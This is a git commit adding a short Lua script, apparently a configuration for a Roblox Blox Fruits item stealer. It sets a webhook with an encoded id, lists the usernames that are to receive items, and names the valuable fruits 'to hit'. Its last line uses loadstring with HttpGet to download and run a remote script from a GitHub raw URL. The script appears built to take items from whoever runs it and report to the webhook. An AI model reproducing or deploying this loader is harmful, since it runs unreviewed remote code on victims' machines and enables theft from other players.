e64547dab23a45c8861fdbbeebd5cb79eff0cb1b
Ammar-u <ashiramir27@gmail.com>
2025-04-13 15:08:50 +0500

    Create ...lua

---
+++ ...lua
@@ -0,0 +1,5 @@
+webhook = ""https://webhook-protect.vercel.app/api/webhook?id=N2hnUDMtaXdKX1hWUW5MZUYxeDNLZzpwTEVrclpPMmlBa2xzM25hMDNfMHZBMk1FVnJwQldvOF9PTkpUN0JpSFZfdEJiVmx5SjAxVkZET1M1dXFtZHhyZTIzT24wbEd3Sk45eVg1dTY0MW1ubEpJN2lDdUJST1BsRmV1RjFHSXNwel8wZXNuM0VfZGthU1pKS2V3NTJJaEllUmFYSGQ0UklIZE9UalJnMHlPT3JVT1pfbU8zQWVWYllrbC0wOGo5X2c
+Usernames = {"Ammar_Ronaldo96", "Ammar_Ronaldo96"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
